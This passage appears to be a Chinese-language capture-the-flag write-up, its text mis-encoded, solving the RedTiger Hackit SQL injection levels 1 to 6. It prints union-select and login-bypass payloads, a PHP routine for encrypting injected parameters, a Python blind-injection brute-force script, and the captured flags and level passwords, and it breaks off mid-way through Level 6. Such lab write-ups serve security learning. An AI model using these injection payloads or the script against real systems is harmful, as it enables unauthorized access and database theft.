<p>å¦‚æœæŒ‰ç…§å¸¸è§„çš„æ˜¾ç¤ºè¡¨ã€åˆ—ä¼šå‡ºç° <code>Some things are disabled!!!</code> ä¹Ÿå°±æ˜¯è¢«è¿‡æ»¤äº†ã€‚ä½†æ˜¯è€ƒè™‘åˆ°è¡¨åç»™æˆ‘ä»¬äº†ï¼Œå¹¶ä¸”æ ¹æ®æè¿°ï¼Œå¯ä»¥çŒœæµ‹è¡¨å†…æœ‰<code>username, password</code> ä¸¤ä¸ªå­—æ®µã€‚å› æ­¤æ„é€ å¦‚ä¸‹paylaodï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=-1 union select 1,2,username,password from level1_users</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°ç”¨æˆ·åä¸ºï¼šHornoxeï¼Œå¯†ç ä¸ºï¼šthatwaseasyã€‚æˆåŠŸç™»å½•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 27cbddc803ecde822d87a7e8639f9315  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: passwords_will_change_over_time_let_us_do_a_shitty_rhyme</span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥åˆ°wechallä¸Šæäº¤flagï¼Œç½‘å€ï¼šhttps://www.wechall.net/14-levels-on-Hackit.html</p>
<h1 id="level-2">Level-2</h1>
<h2 id="é¢˜ç›®æè¿°-1">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318153929.png" /></p>
<p>æ ¹æ®æè¿°ï¼Œè¿™é“é¢˜æ˜¯ç™»å½•ç»•è¿‡ã€‚</p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-1">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>åˆ†åˆ«å¯¹usernameå’Œpasswordæµ‹è¯•ï¼Œç»“æœå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=123&amp;login=Login</span><br></pre></td></tr></table></figure> å¯¹åº”ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154813.png" /></p>
<p>è€Œ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>å¯¹åº”ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154617.png" /></p>
<p>å› æ­¤æ³¨å…¥ç‚¹åº”è¯¥åœ¨passwordã€‚</p>
<p>å¹¶ä¸” <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>åˆ™ä¸å‡ºç°æŠ¥é”™ä¿¡æ¯ï¼Œåªå‡ºç° <code>login incorrect!</code>ã€‚è¿™å°±æ›´åŠ ç¡®å®špasswordä¸ºæ³¨å…¥ç‚¹ã€‚</p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-1">æ³¨å…¥è¿‡ç¨‹</h2>
<p>æœ¬é¢˜ä¸ºç™»å½•ç»•è¿‡ï¼Œå› æ­¤å°è¯•ä¸‡èƒ½å¯†ç ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27; or 1=1#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°æˆåŠŸç™»å½•ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154759.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 1222e2d4ad5da677efb188550528bfaa  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: feed_the_cat_who_eats_your_bread</span><br></pre></td></tr></table></figure>
<h1 id="level-3">Level-3</h1>
<h2 id="é¢˜ç›®æè¿°-2">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154944.png" /></p>
<p>æœ¬é¢˜å¾ˆæœ‰éš¾åº¦ï¼Œæ³¨æ„æç¤º <code>try to get an error</code>ã€‚ç‚¹å‡» <code>TheCow</code> å’Œ <code>Admin</code> urlä¼šå‡ºç° <code>usr</code> å‚æ•°ï¼Œä½†æ˜¯ä¸ä¹±æ˜¯ <code>1=1</code> è¿˜æ˜¯ <code>1=2</code> æˆ–è€…åŠ å•å¼•å·éƒ½ä¸èµ·ä½œç”¨ï¼Œå¹¶ä¸”å°†åŸæ¥çš„usrç»è¿‡base64è§£ç åå¾—åˆ°çš„ä¹Ÿåªæ˜¯ä¸€ä¸²æ•°å­—ï¼Œè·ŸTheCowå’ŒAdminæ— æ³•å¯¹ä¸Šã€‚æŸ¥çœ‹å¤§ä½¬çš„writeupä¹‹åå‘ç°ï¼Œéœ€è¦<strong>ä¼ å…¥æ•°ç»„è®©å®ƒæŠ¥é”™</strong>ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318155401.png" /></p>
<p>æ³¨æ„ <code>/var/www/html/hackit/urlcrypt.inc</code> ï¼Œè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè¾“å…¥ç½‘å€ï¼š<code>http://redtiger.labs.overthewire.org/urlcrypt.inc</code> å¹¶ä¸”æŸ¥çœ‹æºç å¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// warning! ugly code ahead :)</span></span><br><span class="line">	<span class="comment">// requires php5.x, sorry for that</span></span><br><span class="line">  		</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;<span class="number">3</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> (<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>,<span class="variable">$str</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=<span class="number">3</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">3</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">					<span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„å‰é¢çš„æç¤ºï¼Œä»£ç åªèƒ½è¿è¡Œåœ¨PHP5.x ç‰ˆæœ¬ï¼Œå¤ªé«˜æˆ–è€…å¤ªä½çš„ç‰ˆæœ¬ä¼šå¯¼è‡´æœ€ç»ˆçš„åŠ å¯†ç»“æœä¸å¯¹ï¼ï¼ï¼</p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-2">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>æ¨èç½‘å€ï¼Œå¯ä»¥é€‰æ‹©phpç‰ˆæœ¬ï¼šhttp://www.dooccn.com/php5.5/</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160027.png" /></p>
<p>å°†ç‚¹å‡»Adminä¹‹åå¾—åˆ°çš„usrçš„å€¼ä»£å…¥è§£å¯†å‘ç°ç»“æœæ­£å¥½æ˜¯Adminï¼Œå› æ­¤å¾—å‡ºç»“è®ºï¼Œusrå°±æ˜¯æ³¨å…¥ç‚¹ï¼Œå¹¶ä¸”éœ€è¦å°†payloadç»è¿‡åŠ å¯†åå†ä¼ å…¥ã€‚å°† <code>Admin'</code> åŠ å¯†åä¼ å…¥ï¼Œå‘ç°æŠ¥é”™ï¼Œè€Œ <code>Admin'#</code> åŠ å¯†åä¼ å…¥æ­£å¸¸æ˜¾ç¤ºã€‚å› æ­¤é—­åˆæ–¹å¼ä¸ºå•å¼•å·ã€‚</p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-2">æ³¨å…¥è¿‡ç¨‹</h2>
<p>é¦–å…ˆï¼Œè¡¨åå·²ç»ç»™äº†ï¼Œä¸ºï¼š<code>level3_users</code>ï¼Œéœ€è¦è·å¾—Adminçš„å¯†ç ï¼ŒçŒœæµ‹å­—æ®µåä¸ºï¼š<code>password</code>ã€‚ï¼ˆè¿™ä¸ªç½‘ç«™çš„å­—æ®µåéƒ½æ¯”è¾ƒæ­£å¸¸ï¼‰å› æ­¤æ„é€ payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµ‹è¯•å­—æ®µæ•°ï¼š?usr=Admin&#x27; order by 7#  </span><br><span class="line">åŠ å¯†åï¼šMDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµ‹è¯•æ˜¾ç¤ºä½ï¼š?usr=&#x27; union select 1,2,3,4,5,6,7# </span><br><span class="line">åŠ å¯†åï¼šMDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY2</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160839.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¾—åˆ°å¯†ç ï¼š?usr=&#x27; union select 1,2,3,4,5,6,password from level3_users wehre username=&#x27;admin&#x27;# </span><br><span class="line">åŠ å¯†åï¼šMDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMTQwMjI4MDYzMTk4MTM1MTA3MTA2MTgwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTU4MjIwMDcxMDQwMjIwMjA5MDMz</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161210.png" /></p>
<p>æ³¨æ„ç™»å½•çš„æ—¶å€™ï¼ŒUsernameä¸ºadminï¼Œä¸è¦å¤§å†™ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca</span><br><span class="line"></span><br><span class="line">The password for the next level is: put_the_kitten_on_your_head</span><br></pre></td></tr></table></figure>
<h1 id="level-4">Level-4</h1>
<h2 id="é¢˜ç›®æè¿°-3">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161335.png" /></p>
<p>å‘ç°ç»™å‡ºäº†è¡¨åä¸ºï¼šlevel4_secretï¼Œ å­—æ®µåä¸ºï¼škeywordï¼Œå¹¶ä¸”è¿‡æ»¤äº† likeã€‚</p>
<p>ç‚¹å‡» <code>Click me</code>ï¼Œurlå‡ºç°id=1ã€‚</p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-3">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>åˆ†åˆ«ç”¨ <code>?id=1=1</code> å’Œ <code>?id=1=2</code> æµ‹è¯•ï¼Œåˆ†åˆ«å¯¹åº”å¦‚ä¸‹çš„ç»“æœï¼š</p>
<ul>
<li>å‰è€…æç¤ºä¸ºï¼š<code>Query returned 1 rows.</code></li>
<li>åè€…æç¤ºä¸ºï¼š<code>Query returned 0 rows.</code></li>
</ul>
<p>å› æ­¤ä¸ºæ•°å­—å‹çš„æ³¨å…¥ç‚¹ã€‚</p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-3">æ³¨å…¥è¿‡ç¨‹</h2>
<p>æ³¨æ„æœ¬é¢˜æ˜¯ç›²æ³¨ã€‚å¹¶ä¸”å¦‚æœåˆ¤æ–­é”™è¯¯å°†ä¼šå‡ºç°æç¤º<code>Query returned 0 rows.</code>ï¼Œè€Œåˆ¤æ–­æ­£ç¡®åˆ™ä¼šå‡ºç°<code>Query returned 1 rows.</code>æˆ–è€…<code>Query returned 2 rows.</code>ã€‚å› æ­¤æ ¹æ®é”™è¯¯çš„æç¤ºä¸åŒå¯ä»¥å…ˆæµ‹è¯•ä»¥ä¸‹wordçš„é•¿åº¦ä¸ºå¤šå°‘ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and length((select keyword from level4_secret limit 0,1))=21</span><br></pre></td></tr></table></figure></p>
<p>ä¸æ–­ä¿®æ”¹åé¢çš„å€¼ï¼Œå‘ç°é•¿åº¦ä¸º21ï¼Œå› æ­¤ç¼–å†™å¦‚ä¸‹è„šæœ¬ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">url = <span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php&#x27;</span>  </span><br><span class="line">header = &#123;  </span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">payload = <span class="string">&#x27;1 and ascii(substr((select keyword from level4_secret limit 0,1),%d,1))=%d&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">22</span>):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  </span><br><span class="line">        param = &#123;  </span><br><span class="line">            <span class="string">&quot;id&quot;</span>: payload % (i, j)  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.get(url, params=param, headers=header)  </span><br><span class="line">        time.sleep(<span class="number">0.2</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Query returned 0 rows&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line"> flag += <span class="built_in">chr</span>(j)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure> ï¼ˆæœ¬é¢˜éœ€è¦æ³¨æ„ï¼Œæ¯æ¬¡é€šè¿‡éƒ½ä¼šç»™ä¸€ä¸ª<code>The password for the next level is:xxx</code> è¿™æ˜¯ç”¨æ¥ç™»å½•çš„ï¼Œä¼šä¿å­˜åœ¨cookieä¸­ï¼Œæ‰€ä»¥è¦åœ¨è„šæœ¬ä¸­æ·»åŠ cookieï¼Œå¦åˆ™æ— æ³•è®¿é—®ã€‚å¯ä»¥æŠ“åŒ…æŸ¥çœ‹cookieï¼‰</p>
<p>å¾—åˆ°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">killstickswithbr1cks!</span><br></pre></td></tr></table></figure></p>
<p>æˆåŠŸæ³¨å…¥ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa</span><br><span class="line"></span><br><span class="line">The password for the next level is: this_hack_it&#x27;s_old</span><br></pre></td></tr></table></figure></p>
<h1 id="level-5">Level-5</h1>
<h2 id="é¢˜ç›®æè¿°-4">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318165905.png" /></p>
<p>æœ¬é¢˜ä¹Ÿæ˜¯ç™»å½•ç»•è¿‡ï¼Œå¹¶ä¸”å­˜åœ¨è¿‡æ»¤ï¼Œè€Œä¸”å¯†ç æ˜¯ç»è¿‡md5åŠ å¯†çš„ã€‚</p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-4">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>åˆ†åˆ«ä½¿ç”¨ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. username=1&#x27;&amp;password=1&amp;login=Login</span><br><span class="line">2. username=1&#x27;#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°å‰è€…å‡ºç°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;/var/www/html/hackit/level5.php</span><br></pre></td></tr></table></figure></p>
<p>è€Œåè€…æ²¡æœ‰ï¼Œè¯´æ˜ usernameä¸ºæ³¨å…¥ç‚¹ï¼Œå¹¶ä¸”é—­åˆæ–¹å¼ä¸ºå•å¼•å·ã€‚</p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-4">æ³¨å…¥è¿‡ç¨‹</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµ‹è¯•å­—æ®µæ•°ï¼šusername=1&#x27; order by 2#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure>
<p>æœ¬é¢˜æ˜¯ç™»å½•ç»•è¿‡ï¼Œæ‰€ä»¥ä¼˜å…ˆå°è¯• <code>1' or 1=1#</code> å‘ç°æ— æ³•ç™»å½•ã€‚åˆå› ä¸ºå­—æ®µæ•°ä¸º2ï¼Œå› æ­¤åšä¸€ä¸ªçŒœæµ‹ï¼ˆè¿™å¾ˆé‡è¦ï¼Œå¾ˆå¤šæƒ…å†µéƒ½éœ€è¦çŒœæµ‹ï¼‰ï¼š</p>
<blockquote>
<p>è¿™ä¸¤ä¸ªå­—æ®µä¸€ä¸ªæ˜¯usernameï¼Œå¦ä¸€ä¸ªæ˜¯passwordã€‚æ ¹æ®è¾“å…¥çš„usernameï¼Œå»æ•°æ®åº“æŸ¥è¯¢æ˜¯å¦å­˜åœ¨è¯¥ç”¨æˆ·ï¼Œå¦‚æœå­˜åœ¨è¯¥ç”¨æˆ·åˆ™è¿”å›usernameå’Œpasswordï¼Œç„¶åå°†è¿”å›çš„passwordå’Œè¾“å…¥çš„passwordè¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸€æ ·åˆ™ç™»å½•æˆåŠŸï¼Œå¦åˆ™ç™»é™†å¤±è´¥ã€‚</p>
</blockquote>
<p>æ ¹æ®è¿™çŒœæµ‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬éšä¾¿æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·ï¼Œè¿™æ ·å­å°±æ²¡æœ‰è¿”å›çš„ç»“æœã€‚ç„¶åè”åˆæŸ¥è¯¢ï¼Œå¯†ç å­—æ®µä¸º<code>md5(number)</code>ï¼Œè¿™æ ·å­å°±ä¼šè¿”å›ä¸€ä¸ªç»“æœï¼Œå…¶ä¸­å¯†ç å­—æ®µä¸º <code>md5(number)</code> ã€‚å¦‚æœè¾“å…¥çš„passwordä¸º <code>number</code> ï¼Œåˆ™md5åŠ å¯†åä¼šä¸è¿”å›ç»“æœä¸­çš„å¯†ç ä¸€è‡´ï¼Œä»è€Œç™»é™†æˆåŠŸã€‚æ‰€ä»¥æ„é€ å¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select 1,md5(1)#&amp;password=1&amp;login=Login</span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">username: 1&#x27; union select 1,md5(1)#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure></p>
<p>éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼š 1. ä¸Šé¢æ‰€è¿°çš„ number è¦ä¸€æ ·ï¼› 2. è¦å¾—åˆ°passwordæ‰€åœ¨çš„ä½ç½®ï¼Œè¦ä¹ˆç¬¬ä¸€ä¸ªï¼Œè¦ä¹ˆç¬¬äºŒä¸ªï¼Œå°è¯•ä¸¤æ¬¡å°±å‡ºæ¥äº†ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: the_stone_is_cold</span><br></pre></td></tr></table></figure>
<h1 id="level-6">Level-6 â­</h1>
<h2 id="é¢˜ç›®æè¿°-5">é¢˜ç›®æè¿°</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318171918.png" /></p>
<p>ç‚¹å‡» <code>Click me</code> å‘ç°urlå‡ºç°å˜åŒ–ï¼Œå¤šäº†ä¸€ä¸ª <code>user</code> å‚æ•°ã€‚</p>
<h2 id="æµ‹è¯•æ³¨å…¥ç‚¹-5">æµ‹è¯•æ³¨å…¥ç‚¹</h2>
<p>åˆ†åˆ«ä½¿ç”¨ <code>?user=1=1</code> å’Œ <code>?user=1=2</code> è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°å‰è€…å‡ºç°æŠ¥é”™ï¼Œè€Œåè€…æ²¡æœ‰æŠ¥é”™ï¼Œå› æ­¤userä¸ºæ•°å­—å‹æ³¨å…¥ç‚¹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172316.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172325.png" /></p>
<h2 id="æ³¨å…¥è¿‡ç¨‹-5">æ³¨å…¥è¿‡ç¨‹</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµ‹è¯•å­—æ®µæ•°ï¼š?user=1 order by 5</span><br></pre></td></tr></table></figure>
<p>å­—æ®µæ•°ä¸º5ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµ‹è¯•æ˜¾ç¤ºä½ï¼š?user=-1 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ç»“æœï¼š<code>User not found</code>ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æ˜¾ç¤ºä½ï¼Œåªæ˜¯è¿”å›äº†user=-1çš„æŸ¥è¯¢ç»“æœã€‚å¦‚ä¸‹payloadçš„ç»“æœä¹Ÿæ˜¯ä¸€æ ·ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,2,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯éšä¾¿çš„ä¸€äº›å°è¯•ï¼Œåˆ†åˆ«å°† <code>admin</code>, <code>deddlef</code>, <code>username</code>,<code>password</code> å››ä¸ªå…³é”®è¯åˆ†åˆ«å¸¦å…¥äº”ä¸ªä½ç½®ï¼ŒåŸºæœ¬éƒ½æ˜¯æç¤ºï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318191919.png" /></p>
<p>åªæœ‰ä¸‹é¢çš„payloadæœ‰æ‰€ä¸åŒï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,username,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318192043.png" /></p>
<h3 id="æ€è·¯">æ€è·¯ â­</h3>
<p>å‡ºç°äº†æ–°çš„æ˜¾ç¤ºã€‚çœ‹äº†å¤§ä½¬çš„writeupï¼Œå¾—åˆ°å¦‚ä¸‹æ€è·¯ï¼š</p>
<p>åå°è¿›è¡Œäº†äºŒæ¬¡æŸ¥è¯¢ï¼Œé¦–å…ˆæ£€æŸ¥ user å‚æ•°ï¼Œå¦‚æœæŸ¥è¯¢çš„ user å­˜åœ¨çš„è¯ï¼Œåˆ™ä¼šè¿”å›ç»“æœï¼Œè¿™ä¸ªç»“æœæœ‰5åˆ—ï¼Œå³5ä¸ªå­—æ®µã€‚ç„¶åå†å°†ç»“æœä¸­çš„ç¬¬äºŒä¸ªå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼Œæ­¤æ—¶å¾—åˆ°çš„ç»“æœæ‰ä¼šæœ€ç»ˆæ˜¾ç¤ºå‡ºæ¥ï¼Œå³ä¸Šå›¾ä¸­çš„ usernameå’Œemailã€‚å› æ­¤ï¼ŒçœŸæ­£çš„æ³¨å…¥ç‚¹æ˜¯ç¬¬äºŒä¸ªå­—æ®µã€‚ è§£é‡Šï¼š <code>user=-1 union select 1,2,3,4,5</code> è¿”å›çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">å­—æ®µ1</th>
<th style="text-align: center;">å­—æ®µ2</th>
<th style="text-align: center;">å­—æ®µ3</th>
<th style="text-align: center;">å­—æ®µ4</th>
<th style="text-align: center;">å­—æ®µ5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">2</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>è€Œ<code>user=-1 union select 1,username,3,4,5</code> è¿”å›çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">å­—æ®µ1</th>
<th style="text-align: center;">å­—æ®µ2</th>
<th style="text-align: center;">å­—æ®µ3</th>
<th style="text-align: center;">å­—æ®µ4</th>
<th style="text-align: center;">å­—æ®µ5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">username</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>æ­¤æ—¶å­—æ®µ2å³ä¸ºæ³¨å…¥ç‚¹ï¼Œå¦‚æœç›´æ¥è¾“å…¥ adminï¼Œåˆ™ä¼šè¿”å›adminçš„ä¿¡æ¯ã€‚</p>
<h3 id="è¿‡ç¨‹">è¿‡ç¨‹</h3>
